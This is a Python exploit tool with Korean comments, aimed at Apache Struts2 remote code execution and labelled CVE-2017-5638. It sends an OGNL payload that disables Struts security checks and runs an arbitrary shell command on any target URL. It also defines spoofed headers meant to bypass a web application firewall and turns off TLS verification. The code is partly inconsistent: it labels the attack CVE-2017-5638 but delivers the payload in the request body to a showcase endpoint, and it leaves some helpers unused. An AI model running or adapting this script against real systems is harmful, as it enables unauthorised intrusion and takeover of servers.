import requests
import argparse
import base64
import urllib.parse
import warnings
from urllib.parse import urlparse

# SSL 경고 무시
warnings.simplefilter('ignore', category=UserWarning)

# Base64 인코딩
def encode_base64(cmd):
    return base64.b64encode(cmd.encode()).decode()

# HTTP 요청 헤더 변조 (WAF 우회)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "https://google.com",
    "X-Forwarded-For": "127.0.0.1"
}

# CVE-2017-5638 Exploit
def exploit_cve_2017_5638(target_url, cmd):
    try:
        # OGNL Payload
        ognl_payload = (
            f"%{{(#context['xwork.MethodAccessor.denyMethodExecution']=false)."
            f"(#_memberAccess['allowStaticMethodAccess']=true)."
            f"(@java.lang.Runtime@getRuntime().exec('{cmd}'))}}"
        )
        
        # URL Encode the payload
        encoded_payload = urllib.parse.quote(ognl_payload)
        
        # Custom headers
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }
        
        exploit_url = f"{target_url}/struts2-showcase/integration/saveGangster.action"
        response = requests.post(exploit_url, headers=headers, data=encoded_payload, verify=False, timeout=10)
        
        if response.status_code == 200:
            print("[SUCCESS] CVE-2017-5638 Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print("[FAIL] Exploit attempt failed. Check parameters or target availability.")
    except requests.exceptions.RequestException as err:
        print(f"[ERROR] {err}")
        print("[FAIL] Exploit attempt failed.")

# 메인 함수
def main():
    parser = argparse.ArgumentParser(
        description="Apache Struts2 Remote Code Execution (RCE) Exploit Tool",
        usage="python3 exploit.py --url <URL> --cmd <COMMAND>"
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--cmd", required=True, help="Command to execute")

    args = parser.parse_args()

    print("[INFO] Attempting CVE-2017-5638 exploitation...")
    exploit_cve_2017_5638(args.url, args.cmd)

if __name__ == "__main__":
    main()
